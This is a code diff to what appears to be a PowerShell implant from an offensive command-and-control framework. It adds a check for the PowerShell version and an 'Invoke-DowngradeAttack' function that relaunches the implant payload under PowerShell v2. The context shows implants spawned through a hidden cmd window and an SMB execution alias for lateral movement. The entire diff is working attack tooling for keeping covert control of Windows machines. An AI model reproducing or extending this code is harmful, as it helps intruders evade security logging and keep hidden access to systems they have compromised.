@@ -23,8 +23,16 @@ Function CheckArchitecture
         Write-Output "Unknown Architecture Detected"
     }
 }
+Function CheckVersionTwo 
+{
+    $psver = $PSVersionTable.psversion.Major
+    if ($psver -ne '2') {
+        Write-Output "`n[+] Powershell version $psver detected. Run Invoke-DowngradeAttack to try using PS v2"
+    }
+}
 $global:ImpUpgrade = $False
 CheckArchitecture
+CheckVersionTwo
 Function StartAnotherImplant {
     if ($global:ImpUpgrade) {
         start-process -windowstyle hidden cmd -args "/c `"$env:windir\sysnative\windowspowershell\v1.0\$payload`""
@@ -34,6 +42,11 @@ Function StartAnotherImplant {
 }
 sal s startanotherimplant
 sal invoke-smblogin invoke-smbexec
+Function Invoke-DowngradeAttack 
+{
+    $payload = $payload -replace "-exec", "-v 2 -exec"
+    StartAnotherImplant
+}
 function Test-Administrator  
 {  
     $user = [Security.Principal.WindowsIdentity]::GetCurrent();
